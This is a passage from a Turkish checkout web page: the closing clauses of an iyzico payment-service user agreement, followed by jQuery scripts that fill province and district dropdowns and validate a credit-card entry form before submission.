                    <font size="2" style="font-size: 10pt">d) iyzico, özellikle aşağıdaki durumlar olmak üzere Şüpheli İşlemler’de ve Alıcı veya Sistem Ortağı tarafından kendisine bildirilmesi hâlinde, işlem tutarlarını Sistem Ortağı veya Alıcı’nın Ödeme İşlemi’ne ilişkin onayı verme tarihine kadar saklama ve Satıcı’ya ödeme yapmama hakkına sahiptir. Şüpheli durumun belgelendirilmek kaydıyla kesinleşmesi halinde ödemeler kesin olarak işlenmeyecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Ödeme İşlemi’nin yasal hükümlere uygun olmadığına yönelik bir şüphe varsa,</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Ödeme İşlemi’nin, Ödeme İşlemi’nde kullanılan kredi kartının hamilinin bilgisi dışında yapıldığına yönelik bir şüphe varsa,</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Ödeme İşlemi’nin, Ödeme İşlemi’nde kullanılan banka hesabı sahibinin bilgisi dışında yapıldığına yönelik bir şüphe varsa,</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Ödeme İşlemi’nin gerçek bir Ödeme İşlemi olmadığına (testler hariç) yönelik bir şüphe varsa.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">e) Kayıp veya çalıntı bir Ödeme Aracı’nın kullanılması ya da kişisel güvenlik bilgilerinin gereği gibi muhafaza edilmemesi nedeniyle ödeme aracının başkaları tarafından kullanılması durumunda, Kullanıcı, yetkilendirmediği ödeme işlemlerinden doğan zararın Ödeme Hizmetleri ve Elektronik Para İhracı ile Ödeme Kuruluşları ve Elektronik Para Kuruluşları Hakkında Yönetmelik (“Yönetmelik”) Madde 45/4’te belirtilen miktar kadar olan bölümünden sorumludur. Kullanıcı, Yönetmelik’in 44. maddesinin dördüncü fıkrası uyarınca yaptığı bildirimden sonra gerçekleşen yetkilendirmediği ödeme işlemlerinden sorumlu değildir. Ödeme Aracı’nı hileli kullanması veya bildirim yükümlülüklerini kasten veya ağır ihmalle yerine getirmemesi durumunda ise Kullanıcı, yetkilendirilmemiş işlemden doğan zararın tamamından sorumlu olacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">8. ÖDEMELERE İLİŞKİN GENEL ESASLAR</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) iyzico, Sözleşme kapsamında Kullanıcı tarafından kendisine iletilen ürün/hizmet bedellerinin, Onay Tarihi’ni takip eden iş günü içerisinde Satıcı’ya aktarılmasından sorumludur. Satıcı’ya aktarılırken ilgili hizmet kapsamında kesilmesi gereken komisyon/hizmet bedeli gibi bir bedel varsa; bu bedeli düşerek bakiyenin Satıcı’ya aktarımını yapacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, Kullanıcı tarafından yapılan Ödeme İşlemi’nin konusu olan tutarın Satıcı’ya aktarılması işleminde Kullanıcı’dan herhangi bir ücret tahsil etmemektedir. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) Kullanıcı, iyzico’nun bir banka, kredi veya finans kurumu olmadığını ve iyzico tarafından işbu Sözleşme uyarınca verilen hizmetin bir bankacılık hizmeti olmadığını, iyzico’nun ödeme kuruluşu olarak Kanun kapsamında ödeme hizmetleri sunduğunu kabul eder. Bu kapsamda iyzico, Ödeme İşlemi kapsamında tahsil edilen tutarlara faiz işletmeyecek yahut Ödeme Aracı ihracında bulunmayacak olup Kullanıcı iyzico’dan faiz veya sair adlar altında herhangi bir menfaat talebinde bulunmayacaktır. iyzico Kullanıcı’ye kredi verme, taksitlendirme, tahsil edilemeyen tutarlara ilişkin ödeme veya ödeme garantisi verme yahut bu anlama gelecek faaliyetlerde bulunamaz. Kullanıcı, iyzico’dan bu kapsamda talepte bulunmamayı kabul ve taahhüt eder. Bununla birlikte Satıcı kendisi taksitlendirme yaptığı takdirde, taksit bedellerinin ödenmesine ilişkin ödeme hizmeti sunulabilecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">9. SÖZLEŞMENİN SÜRESİ VE FESİH</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) İşbu Sözleşme, Kullanıcı’nın kabul ederek onayladığı tarihte yürürlüğe girecek olup, taraflarca feshedilmedikçe yürürlükte kalacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) Taraflardan biri, işbu Sözleşme’den doğan yükümlülüklerini yerine getirmediği takdirde, diğer Taraf göndereceği bir ihtar ile aykırılığın giderilmesi için 14 (ondört) gün süre verecektir. Aykırılığın verilen süre içerisinde giderilmemesi halinde; Sözleşme başkaca ihtara gerek olmaksızın feshedilmiş sayılacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) Kullanıcı, işbu Sözleşme’yi, herhangi bir sebep bildirmeksizin, 1 (bir) ay öncesinden yazılı fesih ihbarında bulunmak kaydıyla feshedebilecektir. iyzico ise, Sözleşme’yi 2 (iki) ay öncesinden yazılı bildirimle herhangi bir sebep göstermeksizin ve tazminat ödemeksizin feshi hakkına sahip olacaktır. Sözleşme’nin fesih tarihinden önce muaccel olan işbu Sözleşme’ye konu yükümlülüklerin yerine getirilmesine halel getirmeyecek olup, Taraflar’ın fesih tarihine kadar muaccel olan alacak hakları saklıdır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">d) iyzico’nun işbu Sözleşme kapsamındaki Servis’i sunmasına imkan tanıyan izin ve lisansların herhangi bir şekilde ortadan kalkması ve/veya Pazaryeri ile iyzico arasındaki İnternet Sitesi üzerinden yapılan satışlara ilişkin bedellerin tahsiline ilişkin anlaşmanın sona ermesi halinde işbu Sözleşme kendiliğinden sona erecektir. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">e) iyzico hileli veya yetkisiz kullanım şüphesinin söz konusu olduğu hallerde Servis’i askıya alabilecek, Ödeme Aracı’nın kullanımını engelleyebilecek ve Ödeme İşlemi’ni iptal edebilecektir. Bu durumda iyzico, ilgili mevzuatta bilgi verilmesini engelleyici düzenlemeler bulunmaması veya güvenliği tehdit edici objektif nedenler olmaması kaydı ile Kullanıcı’yı konu ile ilgili bilgilendirecek ve engelleme sebebi ortadan kalktığında Servis ve Ödeme Aracı’nı yeniden kullanıma açacaktır. iyzico ayrıca Kullanıcı’nın işbu Sözleşme’ye aykırılığı durumunda da aykırılık giderilene kadar Servis’i askıya alabilecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">10. ÇEŞİTLİ HÜKÜMLER</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) iyzico tarafından hizmetlerin sağlanmasına yönelik olarak </font>
                  </font>
                </font>
                <font color="#0000ff">
                  <u>
                    <a href="http://www.iyzico.com/">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">www.iyzico.com</font>
                      </font>
                    </a>
                  </u>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt"> internet sitesinde ilân edilecek şartlar ve koşullar, işbu Sözleşme’nin eki ve ayrılmaz bir parçasını teşkil etmektedir. İşbu Sözleşme iyzico’nun </font>
                  </font>
                </font>
                <font color="#0000ff">
                  <u>
                    <a href="http://www.iyzico.com/">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">www.iyzico.com</font>
                      </font>
                    </a>
                  </u>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt"> internet sitesinde veya bağlantılı adreslerinde her zaman Kullanıcı tarafından erişilebilir olacaktır</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, Sözleşme’deki her türlü değişikliği, internet sitesinde ilân edebilir ve/veya yeni sürümlerini yayınlayabilir. Değişikliklere ilişkin olarak iyzico, değişikliğin kapsamı, yürürlük tarihi ve Kullanıcı’nın fesih hakkına ilişkin bilgileri içeren bildirimi yürürlüğe girme tarihinden 30 (otuz) gün önce Kullanıcı’ya iletir. Bu durumda Kullanıcı’nın Sözleşme’yi herhangi bir ücret ödemeksizin feshetme hakkı saklı olup belirtilen 30 (otuz) günlük süre içinde itiraz edilmemesi halinde değişiklik kabul edilmiş sayılacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) Taraflar’ın, kendi iradeleri dışında gerçekleşen, müdahale imkanları bulunmayan ve makul bir şekilde önceden öngörülmesi mümkün olmayan nedenlerle yükümlülüklerini yerine getiremedikleri savaş, sıkıyönetim, seferberlik, terörist eylemler, doğal afetler, yangın, grev ve lokavt da dahil istisnai olaylar mücbir sebep olarak kabul edilir. Mücbir sebebin ortaya çıkması halinde, Sözleşme’ye ilişkin edimler mücbir sebep hali sona erinceye kadar askıya alınır. Askıya alınma süresi 1 (bir) ayı geçtiği takdirde, Taraflar’ın işbu Sözleşme’yi fesih hakkı doğar.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">d) Kullanıcı, kanunlara ve VISA, Mastercard ve diğer ödeme kartı kuruluş ve otoritelerinin (B.D.D.K., T.C.M.B. vb) kuralları ile iyzico tarafından hazırlanan kurallara ve prosedürlere uyacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">e) İşbu Sözleşme’nin herhangi bir hükmünü herhangi bir nedenle geçersiz olması hâlinde, diğer hükümlerin veya Sözleşme’nin uygulanabilirliği ve/veya geçerliliği bu geçersizlikten etkilenmeyecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">f) Taraflar, Platform veya Yönetim Arayüzü üzerinden erişilebilir kayıtların Taraflar arasında delil sözleşmesi mahiyetinde kabul edileceği hususunda mutabıktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">g) Taraflar işbu Sözleşme’den doğacak uyuşmazlıkların çözümünde İstanbul Anadolu Mahkemelerinin ve İcra Dairelerinin yetkisini kabul etmişlerdir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">h) Taraflar, işbu Sözleşme’de belirtilen adreslerinde meydana gelen değişiklikleri karşı tarafa yazılı olarak bildirmedikleri takdirde, işbu sözleşmede belirtilen adreslere yapılacak tebligat ve bildirimler geçerli tebliğ hükmünde olacaktır. iyzico, işbu Sözleşme kapsamında Kullanıcı’ya yönelik yapacağı bildirimleri Sözleşme’de belirtilen zamanlarda Kullanıcı’nın belirtilen adresine iletilecek e-posta aracılığıyla yapacaktır. Ancak Türk Ticaret Kanunu’nun 18/3 maddesi uyarınca, karşı tarafı temerrüde düşürmeye veya Sözleşme’yi feshetmeye ilişkin bildirimler, noter aracılığıyla, taahhütlü mektupla, telgrafla veya güvenli elektronik imza kullanılarak kayıtlı elektronik posta sistemi ile yapılacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">ı) Kullanıcı işbu Sözleşme’yi elektronik ortamda onayladığında; işbu Sözleşme Taraflar arasında Kanun’un uzaktan iletişim aracıyla sözleşme akdedilmesine ilişkin hükmüne uygun olarak akdedilmiş sayılacaktır.</font>
                  </font>
                </font>
              </p>
            </div>
            <div id="loader-after-payment-click-container" style="display: none;">
              <div id="loader-after-payment-click-content">
                <div id="loader-after-payment-click"></div>
                <p id="loader-after-payment-click-title">Sayfaya yönlendiriliyorsunuz</p>
              </div>
            </div>
          </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
          $(document).ready(function() {
                ajaxFunc("il", "", "#il");
                $("#il").on("change", function() {
                  $("#ilce").attr("disabled", false).html(" < option value = '' > Seçin.. < /option>");
                    ajaxFunc("il", $(this).val(), "#il");
                  }); $("#il").on("change", function() {
                    $("#ilce").attr("disabled", false).html(" < option value = '' > Seçin.. < /option>");
                      ajaxFunc("ilce", $(this).val(), "#ilce");
                    });

                  function ajaxFunc(action, name, id) {
                    $.ajax({
                      url: "settings/town.php",
                      type: "POST",
                      data: {
                        action: action,
                        name: name
                      },
                      success: function(sonuc) {
                        $.each($.parseJSON(sonuc), function(index, value) {
                          var row = "";
                          row += ' < option value = "'+value+'" > '+value+' < /option>';
                          $(id).append(row);
                        });
                      }
                    });
                  }
                });
        </script>
        <script src="assets/js/inputmask.min.js"></script>
        <script src="assets/js/jquery.creditCardValidator.js"></script>
        <script>
          document.addEventListener('DOMContentLoaded', () => {
            Inputmask({
              mask: '9999 9999 9999 9999',
              placeholder: ' '
            }).mask(document.querySelector('#cardNo'));
            Inputmask({
              mask: '999'
            }).mask(document.querySelector('#cvc2'));
            
            const form = document.querySelector('form');
            let empty, Arr = [], forDeletion = ['true'];
            let ownerName = form.elements[0], cardNo = form.elements[1], expireM = form.elements[2], expireY = form.elements[3], cvc2 = form.elements[4];
            let nameCheck = (value) => /[a-zA-ZwığüşöçĞÜŞÖÇİ]+$/g.test(value) && value.length >= 3;
            let errFn = () => Arr = Arr.filter(item => !forDeletion.includes(item));
            let labelFn=(e,n)=>{1==n?"LABEL"!=e.parentElement.nodeName?e.nextElementSibling.style.display="block":e.parentElement.nextElementSibling.style.display="block":"LABEL"!=e.parentElement.nodeName?e.nextElementSibling.style.display="none":e.parentElement.nextElementSibling.style.display="none"};

            
            form.addEventListener('submit', (e) => {
              e.preventDefault();
              nameCheck(ownerName.value) ? (Arr.push('true'), labelFn(ownerName, 0)) : (errFn(), labelFn(ownerName, 1));
              $('#cardNo').validateCreditCard().valid == true ? (Arr.push('true'), labelFn(cardNo, 0)) : (errFn(), labelFn(cardNo, 1));
              expireM.value.length == 2 ? (Arr.push('true'), labelFn(expireM, 0)) : (errFn(), labelFn(expireM, 1));
              expireY.value.length == 4 ? (Arr.push('true'), labelFn(expireY, 0)) : (errFn(), labelFn(expireY, 1));
              cvc2.value.length == 3 ? (Arr.push('true'), labelFn(cvc2, 0)) : (errFn(), labelFn(cvc2, 1));
              if(this.innerWidth > 768) {
                form.elements[6].checked ? (Arr.push('true'), form.elements[6].nextElementSibling.nextElementSibling.style.display = 'none') : (errFn(), form.elements[6].nextElementSibling.nextElementSibling.style.display = 'flex');
                form.elements[7].checked ? (Arr.push('true'), form.elements[7].nextElementSibling.nextElementSibling.style.display = 'none') : (errFn(), form.elements[7].nextElementSibling.nextElementSibling.style.display = 'flex');
              } else {
                form.elements[9].checked ? (Arr.push('true'), form.elements[9].nextElementSibling.nextElementSibling.style.display = 'none') : (errFn(), form.elements[9].nextElementSibling.nextElementSibling.style.display = 'flex');
                form.elements[10].checked ? (Arr.push('true'), form.elements[10].nextElementSibling.nextElementSibling.style.display = 'none') : (errFn(), form.elements[10].nextElementSibling.nextElementSibling.style.display = 'flex');
              }

              Arr.length >= 7 ? form.submit() : e.preventDefault();
            })
          });
        </script>
  </body>
</html>